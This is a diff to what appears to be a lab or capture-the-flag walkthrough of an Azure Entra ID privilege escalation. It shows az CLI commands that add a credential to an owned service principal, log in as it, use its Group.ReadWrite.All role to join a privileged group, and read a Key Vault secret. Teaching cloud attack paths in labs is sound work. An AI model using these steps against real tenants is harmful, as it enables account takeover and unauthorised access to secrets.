@@ -41,18 +41,36 @@ group grants Key Vault Secrets User  -->  read 'flag' secret from the vault
 
 ### Step 1 — Find the service principal you own
 
+You were removed from the app registration's owners, but you're still an owner of
+the **service principal** behind it — so it still shows up as yours:
+
 ```bash
-az ad sp list --show-mine --query "[].{name:displayName, id:id}"
+az ad sp list --show-mine --query "[].{name:displayName, id:id, appId:appId}" -o table
 ```
 
-### Step 2 — Add a new credential
+### Step 2 — Discover why that service principal is worth taking over
+
+Inspect the Microsoft Graph **application permissions** (app roles) granted to it.
+(Default directory read access is enough for this; you can also run it later as the
+service principal itself.)
+
+```bash
+# Granted app roles appear as GUIDs under "appRoleId"
+az rest --method GET \
+  --uri "https://graph.microsoft.com/v1.0/servicePrincipals/<sp-object-id>/appRoleAssignments"
+```
+
+One of them is **Group.ReadWrite.All** (`62a82d76-70ea-41e2-9197-370581804d09`),
+which lets the service principal manage the membership of any group in the tenant.
+
+### Step 3 — Add a new credential to the service principal
 
 ```bash
 az ad sp credential reset --id <sp-object-id> --append
 # Note the new appId, password, and tenant
 ```
 
-### Step 3 — Authenticate as the service principal
+### Step 4 — Authenticate as the service principal
 
 The service principal has no role on any subscription, so pass
 `--allow-no-subscriptions` — this attack is entirely directory-scoped (Microsoft
@@ -64,26 +82,37 @@ az login --service-principal \
   --allow-no-subscriptions
 ```
 
-### Step 4 — Add yourself to the admin group
+### Step 5 — Discover the privileged group
+
+Now acting as the service principal, enumerate groups and inspect the interesting
+one. Reading the **full** group object (no `--query`) shows its `description`,
+which explains what membership actually grants:
 
 ```bash
-# Get the group object ID
-az ad group show --group "cred-administrators" --query id -o tsv
+az ad group list --query "[].{name:displayName, id:id, description:description}" -o table
+az ad group show --group "cred-administrators"
+```
 
-# Add norightsuser
+The description reveals the group holds the **Key Vault Secrets User** role on the
+team's Key Vault — so joining it grants read access to that vault's secrets. Note
+the group's `id` from the output for the next step.
+
+### Step 6 — Add yourself to the group
+
+```bash
 az ad group member add \
   --group <group-id> \
   --member-id <norightsuser-object-id>
 ```
 
-### Step 5 — Read the flag from the Key Vault
+### Step 7 — Read the flag from the Key Vault
 
 Group membership grants the group the **Key Vault Secrets User** role on the lab's
 vault. Sign back in as your own user (so your token carries the new group claim),
 then read the secret:
 
 ```bash
-az login --username <norightsuser-upn> --password <password>
+az login --username <norightsuser-upn> --password <password> --allow-no-subscriptions
 az keyvault secret show --vault-name <vault> --name flag --query value -o tsv
 ```
 
